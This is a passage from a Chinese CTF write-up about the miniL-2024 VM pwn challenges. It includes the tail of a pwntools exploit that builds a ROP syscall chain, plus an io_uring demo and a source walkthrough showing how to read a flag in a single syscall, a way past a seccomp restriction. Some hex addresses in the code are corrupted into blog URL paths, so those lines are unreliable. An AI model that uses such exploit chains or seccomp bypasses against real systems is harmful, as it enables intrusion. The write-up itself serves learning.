class="string">&#x27;44f300&#x27;</span>)</span><br><span class="line">    save_addr(<span class="string">&#x27;486e60&#x27;</span>)</span><br><span class="line">    save_addr(<span class="string">&#x27;455f90&#x27;</span>)</span><br><span class="line">    save_addr(<span class="string">&#x27;4a4319&#x27;</span>)  <span class="comment"># target strncmp</span></span><br><span class="line">    save_addr(<span class="string">&#x27;43b640&#x27;</span>)  <span class="comment"># 0x78</span></span><br><span class="line">    save_addr(<span class="string">&#x27;44d5d4&#x27;</span>)  <span class="comment"># 0x78</span></span><br><span class="line">    SET(<span class="number">0</span>, <span class="string">&#x27;67616c662f&#x27;</span>)</span><br><span class="line">    STORE(<span class="number">0</span>, <span class="string">&#x27;2024/05/10/miniL-2024/0200&#x27;</span>)</span><br><span class="line">    SET(<span class="number">0</span>, <span class="string">&#x27;44f8e0&#x27;</span>)  <span class="comment"># strnlen</span></span><br><span class="line">    STORE(<span class="number">0</span>, <span class="string">&#x27;2024/05/10/miniL-2024/00C8&#x27;</span>)</span><br><span class="line">    SET(<span class="number">0</span>, <span class="string">&#x27;4a9008&#x27;</span>)</span><br><span class="line">    STORE(<span class="number">0</span>, <span class="string">&#x27;2024/05/10/miniL-2024/0100&#x27;</span>)</span><br><span class="line">    SET(<span class="number">0</span>, <span class="string">&#x27;2024/05/10/miniL-2024/0000&#x27;</span>)</span><br><span class="line">    SET(<span class="number">1</span>, <span class="number">3000</span>)</span><br><span class="line">    SET(<span class="number">2</span>, <span class="number">300</span>)</span><br><span class="line">    SET(<span class="number">3</span>, <span class="number">3</span>)</span><br><span class="line">    SET(<span class="number">4</span>, <span class="string">&#x27;4e4000&#x27;</span>)</span><br><span class="line">    payload += <span class="string">&#x27; &#x27;</span></span><br><span class="line">    INT(<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode = shellcraft.ptrace(4, 0xD0, 0x403136, 1)</span></span><br><span class="line"><span class="comment"># shellcode = asm(shellcode)</span></span><br><span class="line"><span class="comment"># get_pid()</span></span><br><span class="line"><span class="comment"># open_flag()</span></span><br><span class="line">mremap()</span><br><span class="line">ru(<span class="string">b&#x27;end with EOF:&#x27;</span>)</span><br><span class="line">payload = payload.encode()</span><br><span class="line">payload += p64_ex(ret) + p64_ex(<span class="number">2</span>) + p64_ex(rsi) + p64_ex(<span class="number">0x4e4200</span>) + p64_ex(rdx_rbx) + p64_ex(<span class="number">0</span>) * <span class="number">2</span> + p64_ex(syscall)</span><br><span class="line">payload += p64_ex(rdi) + p64_ex(<span class="number">2</span>) + p64_ex(rsi) + p64_ex(<span class="number">0x4e4200</span>) + p64_ex(rdx_rbx) + p64_ex(<span class="number">0</span>) * <span class="number">2</span> + p64_ex(syscall)</span><br><span class="line">payload += p64_ex(rdi) + p64_ex(<span class="number">2</span>) + p64_ex(rsi) + p64_ex(<span class="number">0x4e4200</span>) + p64_ex(rdx_rbx) + p64_ex(<span class="number">0</span>) * <span class="number">2</span> + p64_ex(syscall)</span><br><span class="line">payload += p64_ex(ret) + <span class="string">b&#x27;&#x27;</span> + p64_ex(<span class="number">5</span>) + p64_ex(rsi) + p64_ex(<span class="number">0x4e4500</span>) + p64_ex(rdx_rbx) + p64_ex(<span class="number">0x60</span>) * <span class="number">2</span> + p64_ex(read_addr)</span><br><span class="line">payload += p64_ex(rdi) + p64_ex(<span class="number">1</span>) + p64_ex(rsi) + p64_ex(<span class="number">0x4e4500</span>) + p64_ex(rdx_rbx) + p64_ex(<span class="number">0x50</span>) * <span class="number">2</span> + p64_ex(write_addr)</span><br><span class="line">s(payload)</span><br><span class="line"><span class="comment"># s(str(chr(tty.CEOF)).encode())</span></span><br><span class="line"><span class="comment"># s(payload1)</span></span><br><span class="line">s(<span class="built_in">str</span>(<span class="built_in">chr</span>(tty.CEOF)).encode())</span><br><span class="line">s(<span class="built_in">str</span>(<span class="built_in">chr</span>(tty.CEOF)).encode())</span><br><span class="line">s(<span class="built_in">str</span>(<span class="built_in">chr</span>(tty.CEOF)).encode())</span><br><span class="line">gift.io.clean()</span><br><span class="line">gift.io.sock.shutdown(socket.SHUT_WR)</span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="HardVM"><a href="#HardVM" class="headerlink" title="HardVM"></a>HardVM</h3><p>相比easy就“只”开了pie和full reload😭</p>
<p>赛后得知这种可以用一个syscall，利用io_uring实现“一键”orw</p>
<p>io_uring相关资料</p>
<p><a class="link"   href="https://www.korey0sh1.fun/2023/10/31/ACTF/" >K✌️的blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_54218833/article/details/134625794?spm=1001.2014.3001.5502" >Seccomp学习<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://github.com/axboe/liburing/tree/master" >liburing源码<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://mirrors.edge.kernel.org/pub/" >Kernel源码<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>找gpt搓的demo</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;liburing.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_PATH <span class="string">&quot;./flag&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 512</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> <span class="title">ring</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span> *<span class="title">cqe</span>;</span></span><br><span class="line">    <span class="type">void</span> *buffer;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize io_uring</span></span><br><span class="line">    ret = io_uring_queue_init(<span class="number">8</span>, &amp;ring, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_queue_init failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buffer = (<span class="type">void</span>*)<span class="number">0x2024</span>/<span class="number">05</span>/<span class="number">10</span>/miniL<span class="number">-2024</span>/<span class="number">0100</span>;</span><br><span class="line">    mmap((<span class="type">void</span>*)<span class="number">0x2024</span>/<span class="number">05</span>/<span class="number">10</span>/miniL<span class="number">-2024</span>/<span class="number">0000</span>, <span class="number">0x3000</span>, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Prepare open request</span></span><br><span class="line">    sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line">    io_uring_prep_openat(sqe, AT_FDCWD, FILE_PATH, O_RDONLY, <span class="number">0</span>);</span><br><span class="line">    sqe-&gt;flags |= IOSQE_IO_LINK; <span class="comment">// Link this request to the next one</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare read request</span></span><br><span class="line">    sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line">    io_uring_prep_read(sqe, <span class="number">-1</span>, buffer, BUFFER_SIZE, <span class="number">0</span>); <span class="comment">// -1 will be filled by the open result</span></span><br><span class="line">    sqe-&gt;flags |= IOSQE_IO_LINK; <span class="comment">// Link this request to the next one</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare write request</span></span><br><span class="line">    sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line">    io_uring_prep_write(sqe, STDOUT_FILENO, buffer, BUFFER_SIZE, <span class="number">0</span>);</span><br><span class="line">    sqe-&gt;user_data = <span class="number">1</span>;  <span class="comment">// Use user_data to identify this request</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Submit all requests at once</span></span><br><span class="line">    ret = io_uring_submit(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_submit failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// return 1;</span></span><br><span class="line">    <span class="comment">// Process completion events</span></span><br><span class="line">    <span class="type">int</span> completion_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (completion_count &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;io_uring_wait_cqe failed&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cqe-&gt;user_data == <span class="number">1</span>) &#123;  <span class="comment">// Check if it&#x27;s the write completion</span></span><br><span class="line">            <span class="keyword">if</span> (cqe-&gt;res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Write failed: %s\n&quot;</span>, strerror(-cqe-&gt;res));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Successfully written %d bytes\n&quot;</span>, cqe-&gt;res);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        io_uring_cqe_seen(&amp;ring, cqe);</span><br><span class="line">        completion_count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Cleanup</span></span><br><span class="line">    io_uring_queue_exit(&amp;ring);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><code>gcc ./4.c -o 4 -luring -static -g</code></p>
<p>接下来从demo开始分析io_uring的具体实现过程</p>
<h5 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/05/10/miniL-2024/-5-10_15-04-34.png"
                     
                ></p>
<p>首先调用io_uring_queue_init初始化</p>
<p>源码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__cold <span class="type">int</span> <span class="title function_">io_uring_queue_init</span><span class="params">(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring *ring,</span></span><br><span class="line"><span class="params">			       <span class="type">unsigned</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(&amp;p, <span class="number">0</span>, <span class="keyword">sizeof</span>(p));</span><br><span class="line">	p.flags = flags;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> io_uring_queue_init_params(entries, ring, &amp;p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">io_uring_queue_init_params</span><span class="params">(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring *ring,</span></span><br><span class="line"><span class="params">			       <span class="keyword">struct</span> io_uring_params *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = io_uring_queue_init_try_nosqarr(entries, ring, p, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> ret &gt;= <span class="number">0</span> ? <span class="number">0</span> : ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_uring_queue_init_try_nosqarr</span><span class="params">(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring *ring,</span></span><br><span class="line"><span class="params">					   <span class="keyword">struct</span> io_uring_params *p, <span class="type">void</span> *buf,</span></span><br><span class="line"><span class="params">					   <span class="type">size_t</span> buf_size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> flags = p-&gt;flags;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	p-&gt;flags |= IORING_SETUP_NO_SQARRAY;</span><br><span class="line">	ret = __io_uring_queue_init_params(entries, ring, p, buf, buf_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* don&#x27;t fallback if explicitly asked for NOSQARRAY */</span></span><br><span class="line">	<span class="keyword">if</span> (ret != -EINVAL || (flags &amp; IORING_SETUP_NO_SQARRAY))</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	p-&gt;flags = flags;</span><br><span class="line">	<span class="keyword">return</span> __io_uring_queue_init_params(entries, ring, p, buf, buf_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __io_uring_queue_init_params(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring *ring,</span><br><span class="line">				 <span class="keyword">struct</span> io_uring_params *p, <span class="type">void</span> *buf,</span><br><span class="line">				 <span class="type">size_t</span> buf_size)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> fd, ret = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> *sq_array;</span><br><span class="line">	<span class="type">unsigned</span> sq_entries, index;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(ring, <span class="number">0</span>, <span class="keyword">sizeof</span>(*ring));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The kernel does this check already, but checking it here allows us</span></span><br><span class="line"><span class="comment">	 * to avoid handling it below.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY</span><br><span class="line">	    &amp;&amp; !(p-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_NO_MMAP) &#123;</span><br><span class="line">		ret = io_uring_alloc_huge(entries, p, &amp;ring-&gt;sq, &amp;ring-&gt;cq,</span><br><span class="line">						buf, buf_size);</span><br><span class="line">		<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line">		<span class="keyword">if</span> (buf)</span><br><span class="line">			ring-&gt;int_flags |= INT_FLAG_APP_MEM;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fd = __sys_io_uring_setup(entries, p);</span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((p-&gt;flags &amp; IORING_SETUP_NO_MMAP) &amp;&amp;</span><br><span class="line">		    !(ring-&gt;int_flags &amp; INT_FLAG_APP_MEM)) &#123;</span><br><span class="line">			__sys_munmap(ring-&gt;sq.sqes, <span class="number">1</span>);</span><br><span class="line">			io_uring_unmap_rings(&amp;ring-&gt;sq, &amp;ring-&gt;cq);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> fd;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_NO_MMAP)) &#123;</span><br><span class="line">		ret = io_uring_queue_mmap(fd, p, ring);</span><br><span class="line">		<span class="keyword">if</span> (ret) &#123;</span><br><span class="line">			__sys_close(fd);</span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		io_uring_setup_ring_pointers(p, &amp;ring-&gt;sq, &amp;ring-&gt;cq);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Directly map SQ slots to SQEs</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	sq_entries = ring-&gt;sq.ring_entries;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_NO_SQARRAY)) &#123;</span><br><span class="line">		sq_array = ring-&gt;sq.<span class="built_in">array</span>;</span><br><span class="line">		<span class="keyword">for</span> (index = <span class="number">0</span>; index &lt; sq_entries; index++)</span><br><span class="line">			sq_array[index] = index;</span><br><span class="line">	&#125;</span><br><span class="line">	ring-&gt;features = p-&gt;features;</span><br><span class="line">	ring-&gt;flags = p-&gt;flags;</span><br><span class="line">	ring-&gt;enter_ring_fd = fd;</span><br><span class="line">	<span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY) &#123;</span><br><span class="line">		ring-&gt;ring_fd = <span class="number">-1</span>;</span><br><span class="line">		ring-&gt;int_flags |= INT_FLAG_REG_RING | INT_FLAG_REG_REG_RING;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		ring-&gt;ring_fd = fd;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>简单来说就是初始化了一个fd，来和内核做交互，并将其mmap到虚拟内存方便交互<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/05/10/miniL-2024/-5-10_15-09-23.png"
                     
                ></p>
<p>接下来的操作都是对映射到虚拟地址的部分做操作</p>
<h5 id="写入想执行的操作"><a href="#写入想执行的操作" class="headerlink" title="写入想执行的操作"></a>写入想执行的操作</h5><p><code>sqe = *io_uring_get_sqe*(&amp;ring);</code></p>
<p>拿到sqe队列的映射地址</p>
<p><code>*io_uring_prep_openat*(sqe, AT_FDCWD, FILE_PATH, O_RDONLY, 0);</code></p>
<p>对sqe队列这个结构体做调整</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">IOURINGINLINE <span class="type">void</span> <span class="title function_">io_uring_prep_openat</span><span class="params">(<span class="keyword">struct</span> io_uring_sqe *sqe, <span class="type">int</span> dfd,</span></span><br><span class="line"><span class="params">					<span class="type">const</span> <span class="type">char</span> *path, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">					<span class="type">mode_t</span> mode)</span></span><br><span class="line">&#123;</span><br><span class="line">	io_uring_prep_rw(IORING_OP_OPENAT, sqe, dfd, path, mode, <span class="number">0</span>);</span><br><span class="line">	sqe-&gt;open_flags = (__u32) flags;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">IOURINGINLINE <span class="type">void</span> <span class="title function_">io_uring_prep_rw</span><span class="params">(<span class="type">int</span> op, <span class="keyword">struct</span> io_uring_sqe *sqe, <span class="type">int</span> fd,</span></span><br><span class="line"><span class="params">				    <span class="type">const</span> <span class="type">void</span> *addr, <span class="type">unsigned</span> len,</span></span><br><span class="line"><span class="params">				    __u64 offset)</span></span><br><span class="line">&#123;</span><br><span class="line">	sqe-&gt;opcode = (__u8) op;</span><br><span class="line">	sqe-&gt;fd = fd;</span><br><span class="line">	sqe-&gt;off = offset;</span><br><span class="line">	sqe-&gt;addr = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">	sqe-&gt;len = len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>sqe结构体</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> &#123;</span></span><br><span class="line">	__u8	opcode;		<span class="comment">/* type of operation for this sqe */</span></span><br><span class="line">	__u8	flags;		<span class="comment">/* IOSQE_ flags */</span></span><br><span class="line">	__u16	ioprio;		<span class="comment">/* ioprio for the request */</span></span><br><span class="line">	__s32	fd;		<span class="comment">/* file descriptor to do IO on */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__u64	off;	<span class="comment">/* offset into file */</span></span><br><span class="line">		__u64	addr2;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u32	cmd_op;</span><br><span class="line">			__u32	__pad1;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__u64	addr;	<span class="comment">/* pointer to buffer or iovecs */</span></span><br><span class="line">		__u64	splice_off_in;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u32	level;</span><br><span class="line">			__u32	optname;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">	__u32	len;		<span class="comment">/* buffer size or number of iovecs */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">__kernel_rwf_t</span>	rw_flags;</span><br><span class="line">		__u32		fsync_flags;</span><br><span class="line">		__u16		poll_events;	<span class="comment">/* compatibility */</span></span><br><span class="line">		__u32		poll32_events;	<span class="comment">/* word-reversed for BE */</span></span><br><span class="line">		__u32		sync_range_flags;</span><br><span class="line">		__u32		msg_flags;</span><br><span class="line">		__u32		timeout_flags;</span><br><span class="line">		__u32		accept_flags;</span><br><span class="line">		__u32		cancel_flags;</span><br><span class="line">		__u32		open_flags;</span><br><span class="line">		__u32		statx_flags;</span><br><span class="line">		__u32		fadvise_advice;</span><br><span class="line">		__u32		splice_flags;</span><br><span class="line">		__u32		rename_flags;</span><br><span class="line">		__u32		unlink_flags;</span><br><span class="line">		__u32		hardlink_flags;</span><br><span class="line">		__u32		xattr_flags;</span><br><span class="line">		__u32		msg_ring_flags;</span><br><span class="line">		__u32		uring_cmd_flags;</span><br><span class="line">		__u32		waitid_flags;</span><br><span class="line">		__u32		futex_flags;</span><br><span class="line">		__u32		install_fd_flags;</span><br><span class="line">	&#125;;</span><br><span class="line">	__u64	user_data;	<span class="comment">/* data to be passed back at completion time */</span></span><br><span class="line">	<span class="comment">/* pack this to avoid bogus arm OABI complaints */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="comment">/* index into fixed buffers, if used */</span></span><br><span class="line">		__u16	buf_index;</span><br><span class="line">		<span class="comment">/* for grouped buffer selection */</span></span><br><span class="line">		__u16	buf_group;</span><br><span class="line">	&#125; __attribute__((packed));</span><br><span class="line">	<span class="comment">/* personality to use, if used */</span></span><br><span class="line">	__u16	personality;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__s32	splice_fd_in;</span><br><span class="line">		__u32	file_index;</span><br><span class="line">		__u32	optlen;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u16	addr_len;</span><br><span class="line">			__u16	__pad3[<span class="number">1</span>];</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u64	addr3;</span><br><span class="line">			__u64	__pad2[<span class="number">1</span>];</span><br><span class="line">		&#125;;</span><br><span class="line">		__u64	optval;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If the ring is initialized with IORING_SETUP_SQE128, then</span></span><br><span class="line"><span class="comment">		 * this field is used for 80 bytes of arbitrary command data</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		__u8	cmd[<span class="number">0</span>];</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>可以看到这些操作就是在布置sqe结构体，告诉内核我们想做什么</p>
<p><code>*io_uring_prep_read*(sqe, -1, buffer, BUFFER_SIZE, 0);</code></p>
<p><code>*io_uring_prep_write*(sqe, STDOUT_FILENO, buffer, BUFFER_SIZE, 0);</code></p>
<p>同理，这些也是在布置sqe队列</p>
<h5 id="提交队列"><a href="#提交队列" class="headerlink" title="提交队列"></a>提交队列</h5><p><code>ret = *io_uring_submit*(&amp;ring);</code></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">io_uring_submit</span><span class="params">(<span class="keyword">struct</span> io_uring *ring)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> __io_uring_submit_and_wait(ring, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __io_uring_submit_and_wait(<span class="keyword">struct</span> io_uring *ring, <span class="type">unsigned</span> wait_nr)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> __io_uring_submit(ring, __io_uring_flush_sq(ring), wait_nr, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __io_uring_submit(<span class="keyword">struct</span> io_uring *ring, <span class="type">unsigned</span> submitted,</span><br><span class="line">			     <span class="type">unsigned</span> wait_nr, <span class="type">bool</span> getevents)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">bool</span> cq_needs_enter = getevents || wait_nr || cq_ring_needs_enter(ring);</span><br><span class="line">	<span class="type">unsigned</span> flags;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	flags = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (sq_ring_needs_enter(ring, submitted, &amp;flags) || cq_needs_enter) &#123;</span><br><span class="line">		<span class="keyword">if</span> (cq_needs_enter)</span><br><span class="line">			flags |= IORING_ENTER_GETEVENTS;</span><br><span class="line">		<span class="keyword">if</span> (ring-&gt;int_flags &amp; INT_FLAG_REG_RING)</span><br><span class="line">			flags |= IORING_ENTER_REGISTERED_RING;</span><br><span class="line"></span><br><span class="line">		ret = __sys_io_uring_enter(ring-&gt;enter_ring_fd, submitted,</span><br><span class="line">					   wait_nr, flags, <span class="literal">NULL</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		ret = submitted;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>ret = __sys_io_uring_enter(ring-&gt;enter_ring_fd, submitted, wait_nr, flags, NULL);</code></p>
<p>最终利用syscall sys_io_uring_enter向内核提交队列</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/05/10/miniL-2024/-5-10_15-21-02.png"
                     
                ></p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>初始化io队列 –&gt; 将操作写入sqe队列（sqe结构体） –&gt; 提交队列</p>
<h4 id="但是"><a href="#但是" class="headerlink" title="但是"></a>但是</h4><p>有人就会问了，诶，这题不是限制一次syscall吗，sys_io_uring_setup 和 sys_io_uring_enter 不是两个syscall吗，这不是超了吗</p>
<p>诶，其实io_uring正在飞速的迭代，每个内核版本都是不一样的</p>
<p>题目给的内核版本</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/05/10/miniL-2024/-5-10_15-24-25.png"
                     
                ></p>
<p><code>./bzImage: Linux kernel x86 boot executable bzImage, version 6.6.1 (root@fuzz) #2 SMP PREEMPT_DYNAMIC Sat Nov 18 21:11:32 CST 2023, RO-rootFS, swap_dev 0XB, Normal VGA</code></p>
<p>初始化的时候，sys_io_uring_setup 就自带了提交队列的功能</p>
<p>源码如下</p>
